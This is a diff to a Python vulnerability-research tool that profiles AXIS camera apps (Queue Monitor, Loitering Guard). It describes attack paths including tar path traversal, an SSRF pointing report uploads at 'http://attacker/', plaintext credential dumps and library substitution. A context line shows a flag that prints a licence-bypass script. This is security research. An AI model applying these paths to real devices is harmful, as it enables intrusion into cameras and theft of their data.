@@ -2212,7 +2212,171 @@ class AxisEAPAnalyzer:
         }
         return result
 
-    def digital_autotrack_surface(self) -> dict:
+    def queue_monitor_surface(self) -> dict:
+        """
+        AXIS Queue Monitor (tvqu) attack surface.
+
+        appId: 211492  binary: tvqu  version: 3.0.20  arch: ARM32 armhf stripped
+        Bundled: curl (not stripped), libmd5.so, libcjson.so.1, libsodium.so.23
+
+        Architecture mirrors tvgd/tvpc (same codebase family — shared backup/restore pattern).
+        Uses libsodium for data encryption before cloud upload (NaCl boxes).
+
+        Key findings:
+
+        1. Tarslip via .restore_backup CGI (confirmed class, same as tvgd/tvpc)
+           "Untaring temp-restore-params-file.tar.gz to /tmp/backup"
+           Operator-level .restore_backup CGI — upload malicious tar.gz with path traversal.
+
+        2. parhandclient param dump — broader filter gap than tvgd
+           "parhandclient getgroup root.tvqu | grep -v -e 'Counter0Name' -e 'Counter0OccName' -e 'Environment0' -e 'Build0'"
+           WebReportUpload0User, WebReportUpload0ProxyUser written plaintext to /tmp/parambackup.txt.
+
+        3. WebReportUpload0AllowInsecure — TLS bypass flag (operator-writable)
+           Set to 1 to bypass TLS for report upload; combined with WebReportUpload0Url → SSRF.
+
+        4. libsodium NaCl crypto — key derivation unknown
+           crypto_box_easy_afternm, crypto_secretbox, crypto_scalarmult_base.
+           Queue count data encrypted before cloud upload; if key is static → offline decryption.
+
+        5. privacy.sh — systemd service manipulation script (runs as root)
+           "off" action unmasks dbus-com.axis.Storage, storage-manager, storage-stability-helper.
+           PRIV_IMG_URL third argument passed to script — potential SSRF if CGI feeds it.
+
+        6. Viewer-level /.api CGI — queue count exposure
+           Queue counts (people waiting, service time) available at viewer access level.
+           Combined with anonymous="0" param option: potential PII exposure of wait behavior.
+        """
+        result = {
+            'app_id': 211492,
+            'app_name': 'AXIS Queue Monitor',
+            'binary_name': 'tvqu',
+            'version': '3.0.20',
+            'arch': 'ARM32 armhf stripped',
+            'cgi_endpoints': {
+                'viewer': ['/.api'],
+                'operator': ['/.apioperator', '/.restore_backup'],
+                'administrator': ['/.apiadmin'],
+            },
+            'libs': [
+                'libcurl.so.4', 'libgio-2.0.so.0', 'libgobject-2.0.so.0', 'libglib-2.0.so.0',
+                'libaxhttp.so.1', 'libaxevent.so.1', 'libaxparameter.so.1', 'libvdostream.so.1',
+                'liblicensekey.so.1', 'libjansson.so.4',
+            ],
+            'bundled': ['curl (NOT STRIPPED)', 'libmd5.so', 'libcjson.so.1', 'libsodium.so.23'],
+            'crypto': ['crypto_box_easy_afternm', 'crypto_secretbox', 'crypto_scalarmult_base', 'crypto_box_beforenm'],
+            'params_upload': {
+                'WebReportUpload0Url': '(empty, operator-writable)',
+                'WebReportUpload0AllowInsecure': '0 (TLS bypass flag)',
+                'WebReportUpload0User': '(empty)',
+                'WebReportUpload0Proxy': '(empty)',
+                'Httppost0Url': '(empty, operator-writable)',
+                'Httppost0AllowInsecure': '0',
+            },
+            'attack_paths': [
+                {
+                    'id': 'QM-1',
+                    'title': 'Tarslip via .restore_backup operator CGI',
+                    'mechanism': 'tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — no path traversal check; operator uploads malicious tar.gz → arbitrary file write',
+                    'severity': 'HIGH',
+                    'prerequisite': 'Operator-level auth',
+                },
+                {
+                    'id': 'QM-2',
+                    'title': 'WebReportUpload TLS bypass + SSRF',
+                    'mechanism': 'Set WebReportUpload0AllowInsecure=1 + WebReportUpload0Url=http://attacker/; tvqu sends encrypted queue counts to attacker at ReportInterval',
+                    'severity': 'HIGH',
+                    'prerequisite': 'Operator-level axparam write',
+                },
+                {
+                    'id': 'QM-3',
+                    'title': 'parhandclient param dump — credential params to /tmp/parambackup.txt',
+                    'mechanism': 'Filter excludes only 4 param groups; WebReportUpload0User, proxy creds written plaintext to /tmp/',
+                    'severity': 'MEDIUM',
+                    'prerequisite': 'Read access to /tmp/ (local process or via .restore_backup)',
+                },
+                {
+                    'id': 'QM-4',
+                    'title': 'libsodium key extraction → queue data decryption',
+                    'mechanism': 'NaCl key derivation unknown; if static or per-firmware → offline decryption of captured queue uploads',
+                    'severity': 'MEDIUM',
+                    'prerequisite': 'Capture of upload data + key derivation reverse',
+                },
+            ],
+            'privacy_shell': {
+                'path': '/usr/local/packages/tvqu/anon/privacy.sh',
+                'runs_as': 'root (via postinst.sh)',
+                'systemd_targets': ['dbus-com.axis.Storage.service', 'storage-manager', 'storage-stability-helper'],
+            },
+            'license_gate': 'liblicensekey.so.1',
+        }
+        return result
+
+    def loitering_guard_surface(self) -> dict:
+        """
+        AXIS Loitering Guard (loiteringguard) attack surface.
+
+        appId: 46775  binary: loiteringguard  version: 2.3.8  arch: ARM32 armhf stripped
+        CGI: administrator /control.cgi only. LICENSEPAGE: none (no liblicensekey.so).
+
+        Same libscene.so/libgeometry.so/libfixmath.so stack as VMD 4.4.4.
+        Multi-camera support via SocketCameraContainer (opens device file descriptors to remote cameras).
+
+        Key findings:
+
+        1. SocketCameraContainer — multi-camera socket connections
+           Connects to other cameras via socket (OpenCameraDevice → /dev/cam0 fallback).
+           If camera host/port configurable via admin control.cgi JSON → socket SSRF.
+
+        2. libscene.so / libgeometry.so — same substitution surface as VMD/VMD3
+           Proprietary Axis scene libs from firmware path.
+           Substitution with malicious .so → code exec.
+
+        3. AlarmOverlayHandler + AlarmDataContainer
+           updateBoundingBoxContainerForActiveProfiles takes AlarmDataContainer bounding boxes.
+           Malformed bounding box coordinates in zone config → potential geometry crash.
+
+        4. MOTE disconnect tracking (IDD file version check)
+           IDD file has version field; IDD version too low → different code branch.
+           If IDD file writable by co-resident ACAP → version manipulation.
+        """
+        result = {
+            'app_id': 46775,
+            'app_name': 'AXIS Loitering Guard',
+            'binary_name': 'loiteringguard',
+            'version': '2.3.8',
+            'arch': 'ARM32 armhf stripped',
+            'cgi': 'administrator /control.cgi (admin-only)',
+            'license_page': 'none',
+            'libs': [
+                'libaxparameter.so.1', 'libgmodule-2.0.so.0', 'libgio-2.0.so.0',
+                'libaxhttp.so', 'libgobject-2.0.so.0', 'libaxevent.so.1', 'libglib-2.0.so.0',
+                'libscene.so', 'libgeometry.so', 'libfixmath.so.0', 'libglib-utils.so', 'libaxlog.so',
+            ],
+            'classes': [
+                'SocketCameraContainer', 'CGI_Handler', 'AlarmOverlayHandler',
+                'AlarmDataContainer', 'ParseConfig', 'MoteSceneParser', 'API_VersionHandler',
+            ],
+            'attack_paths': [
+                {
+                    'id': 'LG-1',
+                    'title': 'SocketCameraContainer SSRF via admin control.cgi',
+                    'mechanism': 'Multi-camera socket connection target from CGI JSON; attacker-controlled camera host → socket SSRF',
+                    'severity': 'MEDIUM',
+                    'prerequisite': 'Admin-level auth',
+                },
+                {
+                    'id': 'LG-2',
+                    'title': 'libscene.so / libgeometry.so substitution',
+                    'mechanism': 'Same as VMD-4: proprietary scene libs from firmware path; writable path → malicious .so injection',
+                    'severity': 'LOW',
+                    'prerequisite': 'Write access to lib path',
+                },
+            ],
+        }
+        return result
+
+    def dat_encrypted_lua_surface(self) -> dict:
         """
         AXIS Digital Autotracking attack surface.
 
@@ -2857,6 +3021,10 @@ def main():
                         help='Door Controller Extension ARM32 1.1.5 stub + build path leak')
     parser.add_argument('--dat', action='store_true', dest='digital_autotrack_v2',
                         help='Digital Autotracking 1.0.0 encrypted Lua + shttpclient XSS surface')
+    parser.add_argument('--queue-monitor', action='store_true', dest='queue_monitor',
+                        help='Queue Monitor tvqu ARM32 3.0.20 tarslip + libsodium + TLS bypass surface')
+    parser.add_argument('--loitering-guard', action='store_true', dest='loitering_guard',
+                        help='Loitering Guard ARM32 2.3.8 SocketCameraContainer SSRF + libscene surface')
     parser.add_argument('--sbplayer-aarch64', action='store_true', dest='sbplayer_aarch64',
                         help='sbplayer aarch64/ARM32 1.7.1 UpdateURL+SD-card library RCE + hardcoded SYB API cred')
     parser.add_argument('--frida', action='store_true', help='Print Frida license bypass script')
@@ -2936,7 +3104,13 @@ def main():
         results['dce'] = analyzer.dce_surface()
 
     if args.all or args.digital_autotrack_v2:
-        results['digital_autotrack'] = analyzer.digital_autotrack_surface()
+        results['dat_encrypted_lua'] = analyzer.dat_encrypted_lua_surface()
+
+    if args.all or getattr(args, 'queue_monitor', False):
+        results['queue_monitor'] = analyzer.queue_monitor_surface()
+
+    if args.all or getattr(args, 'loitering_guard', False):
+        results['loitering_guard'] = analyzer.loitering_guard_surface()
 
     if args.all or args.sbplayer_aarch64:
         results['sbplayer_aarch64'] = analyzer.sbplayer_aarch64_surface()
